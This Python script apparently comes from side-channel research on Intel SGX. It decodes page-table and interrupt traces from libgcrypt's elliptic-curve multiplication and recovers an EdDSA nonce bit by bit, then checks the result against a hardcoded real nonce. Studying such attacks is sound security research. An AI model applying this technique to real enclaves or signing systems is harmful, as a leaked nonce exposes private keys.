#!/usr/bin/python3
from pprint import pprint
from collections import Counter
import re,sys
import json

INFILE          = 'measurements_raw.txt'
# A(mpi_ec_add_points) && A(mpi_ec_mul_point) && !A(free) && !A(mpi_add)

MULP_TST_ADD = 0x7
MULP_TST = 0x6

MULP_ADD = 0x3
ADD = 0x2
MULP = 0x1

#ITER_REGEX = '(?:11|(?:(?:2|3) 8)|(?:8 2)) (?:(?:5 )|(?:2 2 )|(?:3 8 2)){2,3}(?:11|(?:8 2)) (?:(?:11)|(?:2 8)) '
ITER_REGEX = '(?:11 |(?:8 2 )|(?:2 8 ))(?:(?:(?:5|2 2) (?:5|2 2|3)) (?:5 5 )?|(?:9) )(?:11|(?:8 2)|(?:2 8)) (?:5) '
STARTEND_REGEX = '(11 ){6}'
LINECOUNT_REGEX = '[1-9]+ '
#LENGTH_THRESHOLD = 15
LENGTH_THRESHOLD = 20
LENGTH_UPPER = 55

NONCE           = '0x4f71d012df3c371af3ea4dc38385ca5bb7272f90cb1b008b3ed601c7'\
                  '6de1d496e30cbf625f0a756a678d8f256d5325595cccc83466f36db18f'\
                  '0178eb9925edd3'

ipis = []
ipis_ad = []
with open(INFILE, 'r') as f:
    for l in f.readlines():
        m = re.search('IPI (\d+) with PTE set 0x([0-9A-Fa-f]+)', l)
        if m:
            ipi_nb = int(m.groups()[0])
            pte_set = int(m.groups()[1], base=16)
            ipis.append((ipi_nb, pte_set))
        m = re.search('A/D set 0x([0-9A-Fa-f]+)', l)
        if m:
            pte_set = int(m.groups()[0], base=16)
            ipis_ad.append(pte_set)
     
print("gsgx driver recorded (ipi_nb, pte_set):\n")
#pprint(ipis)
#print(ipis_ad.count(0x7))

cnt = Counter()
i = 0
it = 1
ipi_deltas = ''
for (ipi, pte_set) in ipis:
    #if ipis_ad[ipi-1] == MULP_TST_ADD:
    #    print("\n=== ITERATION {0} ===".format(it))
    #    it += 1

    cnt[pte_set] += 1
    if (pte_set==127):
        print("{0} ".format(i), end='')
        ipi_deltas   += ' ' + str(i)
        i = 0
    else:
        i += 1

d = dict(cnt)
s = json.dumps(d, indent=4, sort_keys=True)
print("\n\nOverall PTE set pattern counts:" + s)
print("\n\nIPI deltas: \n" + ipi_deltas + '\n')


# First, find start and end
m = re.split(STARTEND_REGEX, ipi_deltas)
llongest = 0
longest = ""
for line in m:
    if llongest < len(line):
        llongest = len(line)
        longest = line
#print("Longest part:\n" + longest + "\n")

# Now split the iterations
nonce = []
m = re.split(ITER_REGEX, longest)
for line in m:
    c = re.split(LINECOUNT_REGEX, line)
    print("--> ({0}) {1}".format(len(c), line))
    #print(c)
    if len(c) > LENGTH_UPPER:
        # not able to determine bit, assuming we just missed one
        nonce.append("xx")
        continue
    if len(c) > LENGTH_THRESHOLD:
        nonce.append(1)
    else:
        nonce.append(0)

nonce_s = "".join([str(b) for b in nonce])

print("recovered nonce with missign bits ({0} bits):\n{1}\n".format(len(nonce_s), nonce_s))

nonce = [b for b in nonce if b != "xx"]

#REGEX = '(?:11 (?:5|6) (?:5|6) (?:11|8|9|6))'
#m = re.split(REGEX, ipi_deltas)
#for line in m:
#    print('--> ' + line) # length of string reveals key bits :)
#print("\nregex '{0}' matched {1} times".format(REGEX, len(m)))

#no_add = False
#nonce = []
#ipic = {}
#for (ipi_nb, pte_set) in ipis:
#    if pte_set not in ipic.keys():
#        ipic[pte_set] = 0
#    ipic[pte_set] += 1
#    if pte_set == MULP_ADD:
#        nonce.append(no_add)
#        no_add = False 
#    elif pte_set == MULP:
#        no_add = True
#
#print(ipic)
#
## Remove first x bits
#to_remove = len(nonce) - 512
#if to_remove > 0:
#    nonce = nonce[to_remove:]
#
r = int('0b' + ''.join(['1' if x else '0' for x in nonce]), base=2)
n = int(NONCE, base=16)

print("\nrecovered EdDSA nonce ({0} bits):\n".format(len(nonce)))
print("{0} (recovered)\n{1} (real)".format(hex(r), hex(n)))
print("\n{0} (recovered)\n{1} (real)".format(bin(r), bin(n)))
